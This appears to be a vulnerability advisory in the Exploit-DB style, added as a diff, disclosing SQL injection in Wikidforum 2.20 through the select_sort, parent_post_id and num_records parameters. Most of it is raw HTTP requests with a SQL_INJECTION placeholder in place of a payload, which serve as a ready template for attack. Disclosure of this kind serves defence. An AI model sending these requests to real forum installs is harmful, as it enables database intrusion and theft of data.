@@ -1,0 +1,54 @@
+# Exploit Title: Wikidforum 2.20 - 'select_sort' SQL Injection
+# Date: 2018-10-08
+# Exploit Author: Seccops - Siber Güvenlik Hizmetleri (https://seccops.com)
+# Vendor Homepage: https://sourceforge.net/projects/wikidforum/
+# Software Link: https://sourceforge.net/projects/wikidforum/files/Wikidforum-com-ed.2.20.zip/download
+# Version: 2.20
+# Tested on: Windows 10
+# Vulnerability Type: SQL Injection
+# CVE: -
+ 
+# Vulnerable the POST parameter in search: select_sort
+# HTTP Requests for SQLi Detection:
+ 
+POST /Wikidforum-com-ed.2.20/wikidforum/index.php?action=search&mode=search HTTP/1.1
+Host: localhost
+Content-Length: 428
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: null
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: m_username=testuser; m_passwd=21232f297a57a5a743894a0e4a801fc3
+Connection: close
+ 
+txtsearch=3&opt_search_select=forum&txt_author=3&search_display_field%255b%255d=post_rate&select_sort=SQL_INJECTION
+ 
+# Vulnerable the POST parameter in search: parent_post_id
+# HTTP Requests for SQLi Detection:
+ 
+GET /Wikidforum-com-ed.2.20/wikidforum/rpc.php?action=applications/post/rpc.php&mode=post_rpc&page=1&num_records=25&parent_post_id=SQL_INJECTION HTTP/1.1
+Host: localhost
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+Cookie: m_username=testuser; m_passwd=21232f297a57a5a743894a0e4a801fc3
+ 
+# Vulnerable the POST parameter in search: num_records
+# HTTP Requests for SQLi Detection:
+ 
+GET /Wikidforum-com-ed.2.20/wikidforum/rpc.php?action=applications/post/rpc.php&mode=post_rpc&page=1&num_records=SQL_INJECTION HTTP/1.1
+Host: localhost
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+Cookie: m_username=testuser; m_passwd=21232f297a57a5a743894a0e4a801fc3
